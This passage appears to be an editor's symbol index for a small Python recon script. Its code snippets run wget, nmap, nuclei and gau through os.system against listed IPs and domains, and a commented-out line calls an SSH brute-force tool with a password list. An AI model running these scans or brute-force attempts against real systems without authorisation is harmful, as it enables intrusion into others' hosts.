        "label": "filterip",
        "kind": 2,
        "importPath": "helperfuncts",
        "description": "helperfuncts",
        "peekOfCode": "def filterip(ip):\n    return re.sub(\"\\*\\.\", '', re.sub(\"https?//\", '', re.sub(\"www.\", '', ip)))",
        "detail": "helperfuncts",
        "documentation": {}
    },
    {
        "label": "ip",
        "kind": 5,
        "importPath": "test",
        "description": "test",
        "peekOfCode": "ip = \"google.com\"\n# ip = \"http://github.com/\"\n# ip = \"pixl.rip\"\n# os.system(f'python3 ./libs/programs/CORScanner/cors_scan.py -u {ip}')\n# os.syste(f'{ip}')\n# ffuf\n# dirsearch\n# fierce pl\n# https://github.com/TheRook/subbrute\n# https://github.com/ThoughtfulDev/EagleEye",
        "detail": "test",
        "documentation": {}
    },
    {
        "label": "dostuff",
        "kind": 2,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "def dostuff(ip):\n    print(ip)\n    try:\n        # os.system(f'nmap {filterip(ip)} -oN {basedir}/nmap/{ip}.txt {options[\"nmap\"]}')\n        # # os.system(f'nuclei -u {gethttporhtp(ip)} -o {basedir}/nuclei/{filterip(ip)}.txt {options[\"nuclei\"]}')\n        # os.system(f'gau {ip} --mc \"200\" --o {basedir}/gau/{filterip(ip)}.txt')\n        os.system(f'wget {gethttporhtp(ip)}/robots.txt -O {basedir}/robots/{filterip(ip)}.txt -k')\n        # os.system(f'python3 libs/programs/SSHBrute/ssh-brute.py --hostname {ip} --port 22 --user killerb --passlist sshpass.txt --background >> {basedir}/sshs.txt')\n    except:\n        pass",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "ip2",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "ip2 = \"\"\nipsplit2 = \"\"\noptions = {\n    \"nmap\": \"-r -sV --open -v -A\",\n    \"subfinder\": \"-silent\",\n    \"nuclei\": \"-rdb -fr -stats -ut\",\n}\n# ip1 = \"*.google.com\"\nip1 = \"192.168.10.21\"\nip2 = \"192.168.10.50\"",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "ipsplit2",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "ipsplit2 = \"\"\noptions = {\n    \"nmap\": \"-r -sV --open -v -A\",\n    \"subfinder\": \"-silent\",\n    \"nuclei\": \"-rdb -fr -stats -ut\",\n}\n# ip1 = \"*.google.com\"\nip1 = \"192.168.10.21\"\nip2 = \"192.168.10.50\"\nipsplit1 = ip1.split(\".\")",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "options",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "options = {\n    \"nmap\": \"-r -sV --open -v -A\",\n    \"subfinder\": \"-silent\",\n    \"nuclei\": \"-rdb -fr -stats -ut\",\n}\n# ip1 = \"*.google.com\"\nip1 = \"192.168.10.21\"\nip2 = \"192.168.10.50\"\nipsplit1 = ip1.split(\".\")\nif ip2 != \"\":",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "ip1",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "ip1 = \"192.168.10.21\"\nip2 = \"192.168.10.50\"\nipsplit1 = ip1.split(\".\")\nif ip2 != \"\":\n    ipsplit2 = ip2.split(\".\")\nbasedir = \"./scan\"\nif not os.path.exists(f\"{basedir}\"):\n    os.mkdir(f\"{basedir}\")\ndirs = [\"nmap\", \"nuclei\", \"sqlmap\", \"httpx\", \"subfinder\", \"gau\", \"robots\"]\nfor dir in dirs:",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "ip2",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "ip2 = \"192.168.10.50\"\nipsplit1 = ip1.split(\".\")\nif ip2 != \"\":\n    ipsplit2 = ip2.split(\".\")\nbasedir = \"./scan\"\nif not os.path.exists(f\"{basedir}\"):\n    os.mkdir(f\"{basedir}\")\ndirs = [\"nmap\", \"nuclei\", \"sqlmap\", \"httpx\", \"subfinder\", \"gau\", \"robots\"]\nfor dir in dirs:\n    if not os.path.exists(f\"{basedir}/{dir}\"):",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "ipsplit1",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "ipsplit1 = ip1.split(\".\")\nif ip2 != \"\":\n    ipsplit2 = ip2.split(\".\")\nbasedir = \"./scan\"\nif not os.path.exists(f\"{basedir}\"):\n    os.mkdir(f\"{basedir}\")\ndirs = [\"nmap\", \"nuclei\", \"sqlmap\", \"httpx\", \"subfinder\", \"gau\", \"robots\"]\nfor dir in dirs:\n    if not os.path.exists(f\"{basedir}/{dir}\"):\n        os.mkdir(f\"{basedir}/{dir}\")",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "basedir",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "basedir = \"./scan\"\nif not os.path.exists(f\"{basedir}\"):\n    os.mkdir(f\"{basedir}\")\ndirs = [\"nmap\", \"nuclei\", \"sqlmap\", \"httpx\", \"subfinder\", \"gau\", \"robots\"]\nfor dir in dirs:\n    if not os.path.exists(f\"{basedir}/{dir}\"):\n        os.mkdir(f\"{basedir}/{dir}\")\ndef dostuff(ip):\n    print(ip)\n    try:",
        "detail": "working",
        "documentation": {}
    },
    {
        "label": "dirs",
        "kind": 5,
        "importPath": "working",
        "description": "working",
        "peekOfCode": "dirs = [\"nmap\", \"nuclei\", \"sqlmap\", \"httpx\", \"subfinder\", \"gau\", \"robots\"]\nfor dir in dirs:\n    if not os.path.exists(f\"{basedir}/{dir}\"):\n        os.mkdir(f\"{basedir}/{dir}\")\ndef dostuff(ip):\n    print(ip)\n    try:\n        # os.system(f'nmap {filterip(ip)} -oN {basedir}/nmap/{ip}.txt {options[\"nmap\"]}')\n        # # os.system(f'nuclei -u {gethttporhtp(ip)} -o {basedir}/nuclei/{filterip(ip)}.txt {options[\"nuclei\"]}')\n        # os.system(f'gau {ip} --mc \"200\" --o {basedir}/gau/{filterip(ip)}.txt')",
        "detail": "working",
        "documentation": {}
    }
]